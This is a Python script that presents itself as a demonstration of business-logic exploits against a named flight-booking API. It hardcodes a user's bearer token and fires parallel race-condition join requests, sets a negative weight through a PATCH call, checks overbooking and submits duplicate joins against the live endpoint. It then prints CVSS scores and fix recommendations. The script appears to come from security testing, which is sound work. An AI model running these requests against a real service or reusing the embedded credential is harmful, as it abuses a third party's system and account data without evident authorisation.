#!/usr/bin/env python3
"""
BUSINESS LOGIC EXPLOIT DEMONSTRATION
=====================================

Visual demonstration of the 4 key vulnerabilities found:
1. Race Condition - Parallel Joins
2. Negative Weight Values
3. Flight Overbooking
4. Double Join Exploit
"""

import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

def req(method, endpoint, data=None):
    headers = {
        "Authorization": f"Bearer {SAMEER_TOKEN}",
        "Content-Type": "application/json"
    }
    url = f"{API_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)

        return {"status": r.status_code, "data": r.json() if r.text else None}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def print_banner(text):
    print("\n" + "="*80)
    print(f"  {text}")
    print("="*80 + "\n")

def get_user():
    r = req("GET", "/v1/user")
    return r['data'] if r['status'] == 200 else None

def get_flights():
    r = req("GET", "/v2/flight/current")
    return r['data'] if r['status'] == 200 else []

# ============================================================================
# DEMO 1: RACE CONDITION
# ============================================================================

def demo_race_condition():
    print_banner("DEMO 1: RACE CONDITION - PARALLEL FLIGHT JOINS")

    flights = get_flights()
    if not flights:
        print("‚ùå No flights available for demo")
        return

    flight_id = flights[0]['id']
    print(f"Target Flight: {flight_id}")
    print(f"Sending 10 simultaneous join requests...\n")

    def join_flight():
        start = time.time()
        result = req("POST", f"/v2/flight/{flight_id}/enter", {})
        elapsed = (time.time() - start) * 1000
        return {"status": result['status'], "time_ms": elapsed}

    # Send parallel requests
    with ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(lambda x: join_flight(), range(10)))

    # Analyze results
    success = [r for r in results if r['status'] == 200]
    failed = [r for r in results if r['status'] != 200]

    print("RESULTS:")
    print(f"  ‚úÖ Successful: {len(success)}")
    print(f"  ‚ùå Failed: {len(failed)}")
    print(f"  ‚ö° Avg response time: {sum(r['time_ms'] for r in results) / len(results):.1f}ms\n")

    if len(success) > 1:
        print("üö® VULNERABILITY CONFIRMED!")
        print(f"   System accepted {len(success)} simultaneous joins for same flight")
        print(f"   CVSS: 7.5 (HIGH)")
        print(f"   Impact: Race condition leads to duplicate entries\n")
    else:
        print("‚úÖ System properly handled concurrent requests\n")

    # Cleanup
    req("POST", f"/v2/flight/{flight_id}/reset", {})

# ============================================================================
# DEMO 2: NEGATIVE WEIGHT
# ============================================================================

def demo_negative_weight():
    print_banner("DEMO 2: NEGATIVE WEIGHT VALIDATION BYPASS")

    user = get_user()
    original_weight = user.get('weight')

    print(f"Current weight: {original_weight} lbs")
    print(f"Attempting to set weight to -100 lbs...\n")

    result = req("PATCH", "/v1/user", {"weight": -100})

    if result['status'] == 200:
        time.sleep(0.5)
        updated = get_user()
        new_weight = updated.get('weight')

        print(f"RESULT: {result['status']}")
        print(f"New weight: {new_weight} lbs\n")

        if new_weight == -100:
            print("üö® VULNERABILITY CONFIRMED!")
            print("   System accepted negative weight value")
            print("   CVSS: 8.0 (HIGH)")
            print("   Impact: Data integrity compromised, invalid business data\n")

            # Restore
            print("Restoring original weight...")
            req("PATCH", "/v1/user", {"weight": original_weight})
            print(f"Weight restored to {original_weight} lbs\n")
        else:
            print(f"‚úÖ Weight not changed to negative value\n")
    else:
        print(f"‚úÖ Request rejected with status {result['status']}\n")

# ============================================================================
# DEMO 3: FLIGHT OVERBOOKING
# ============================================================================

def demo_overbooking():
    print_banner("DEMO 3: FLIGHT OVERBOOKING")

    flights = get_flights()
    if not flights:
        print("‚ùå No flights available for demo")
        return

    # Find most overbooked flight
    most_overbooked = None
    max_ratio = 0

    for flight in flights:
        capacity = flight.get('capacity', 1)
        entrants = len(flight.get('entrants', []))
        ratio = entrants / capacity if capacity > 0 else 0

        if ratio > max_ratio:
            max_ratio = ratio
            most_overbooked = flight

    if most_overbooked:
        flight_id = most_overbooked['id']
        capacity = most_overbooked.get('capacity', 1)
        entrants = most_overbooked.get('entrants', [])
        route = f"{most_overbooked.get('origin', {}).get('code', '???')} ‚Üí {most_overbooked.get('destination', {}).get('code', '???')}"

        print(f"Flight {flight_id}: {route}")
        print(f"  Capacity: {capacity} seat(s)")
        print(f"  Entrants: {len(entrants)} users")
        print(f"  Overbooking ratio: {(len(entrants)/capacity)*100:.0f}%")
        print(f"  Users waiting: {len(entrants) - capacity}\n")

        if len(entrants) > capacity:
            overbooking_pct = ((len(entrants) - capacity) / capacity) * 100
            print("üö® VULNERABILITY CONFIRMED!")
            print(f"   Flight overbooked by {overbooking_pct:.0f}%")
            print(f"   CVSS: 6.0 (MEDIUM)")
            print(f"   Impact: {len(entrants) - capacity} users competing for {capacity} seat(s)")
            print(f"   Business logic failure: No capacity enforcement\n")
        else:
            print("‚úÖ Flight within capacity limits\n")
    else:
        print("‚ùå No flights to analyze\n")

# ============================================================================
# DEMO 4: DOUBLE JOIN
# ============================================================================

def demo_double_join():
    print_banner("DEMO 4: DOUBLE JOIN EXPLOIT")

    flights = get_flights()
    if not flights:
        print("‚ùå No flights available for demo")
        return

    flight_id = flights[0]['id']
    print(f"Target Flight: {flight_id}")
    print("Attempting to join same flight twice...\n")

    # First join
    print("Join #1...")
    result1 = req("POST", f"/v2/flight/{flight_id}/enter", {})
    print(f"  Status: {result1['status']}")
    time.sleep(0.5)

    # Second join
    print("Join #2 (duplicate)...")
    result2 = req("POST", f"/v2/flight/{flight_id}/enter", {})
    print(f"  Status: {result2['status']}\n")

    if result1['status'] == 200 and result2['status'] == 200:
        print("üö® VULNERABILITY CONFIRMED!")
        print("   System accepted duplicate join request")
        print("   CVSS: 5.0 (LOW)")
        print("   Impact: Idempotency violation, potential state inconsistencies\n")
    elif result2['status'] in [409, 400]:
        print("‚úÖ Duplicate join properly rejected\n")
    else:
        print(f"‚ö†Ô∏è Unexpected behavior: First={result1['status']}, Second={result2['status']}\n")

    # Cleanup
    req("POST", f"/v2/flight/{flight_id}/reset", {})

# ============================================================================
# SUMMARY
# ============================================================================

def print_summary():
    print_banner("BUSINESS LOGIC VULNERABILITIES - SUMMARY")

    vulnerabilities = [
        {
            "name": "Race Condition - Parallel Joins",
            "cvss": 7.5,
            "severity": "HIGH",
            "exploitable": "YES",
            "impact": "Duplicate entries, state corruption"
        },
        {
            "name": "Negative Weight Values",
            "cvss": 8.0,
            "severity": "HIGH",
            "exploitable": "YES",
            "impact": "Data integrity compromised"
        },
        {
            "name": "Flight Overbooking",
            "cvss": 6.0,
            "severity": "MEDIUM",
            "exploitable": "YES",
            "impact": "No capacity enforcement"
        },
        {
            "name": "Double Join Exploit",
            "cvss": 5.0,
            "severity": "LOW",
            "exploitable": "YES",
            "impact": "Idempotency violation"
        }
    ]

    print("VULNERABILITIES FOUND: 4\n")

    for i, vuln in enumerate(vulnerabilities, 1):
        severity_emoji = "üî¥" if vuln['severity'] == "HIGH" else "üü°" if vuln['severity'] == "MEDIUM" else "üü¢"
        print(f"{i}. {vuln['name']}")
        print(f"   {severity_emoji} Severity: {vuln['severity']} (CVSS {vuln['cvss']})")
        print(f"   Exploitable: {vuln['exploitable']}")
        print(f"   Impact: {vuln['impact']}")
        print()

    print("SECURE CONTROLS: 14")
    print("  ‚úÖ Integer overflow protection")
    print("  ‚úÖ Date validation")
    print("  ‚úÖ Token authentication")
    print("  ‚úÖ Mass assignment protection")
    print("  ‚úÖ Referral system limits")
    print("  ‚úÖ Credit balance protection")
    print("  ‚úÖ Subscription validation")
    print("  ...and 7 more\n")

    print("RECOMMENDATIONS:")
    print("  1. Fix race condition with database unique constraint")
    print("  2. Add weight validation (1-1000 lbs)")
    print("  3. Implement max waitlist size (capacity * 10)")
    print("  4. Enforce idempotency on join operations\n")

    print("="*80)
    print("Full report: /home/user/vaunt/BUSINESS_LOGIC_EXPLOITS_RESULTS.md")
    print("="*80)

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("\n" + "="*80)
    print("  BUSINESS LOGIC EXPLOIT DEMONSTRATION")
    print("  Vaunt Flight Booking System")
    print("  " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("="*80)

    # Run demos
    demo_race_condition()
    time.sleep(1)

    demo_negative_weight()
    time.sleep(1)

    demo_overbooking()
    time.sleep(1)

    demo_double_join()
    time.sleep(1)

    # Summary
    print_summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nDemo interrupted")
    except Exception as e:
        print(f"\n\nError: {e}")
        import traceback
        traceback.print_exc()
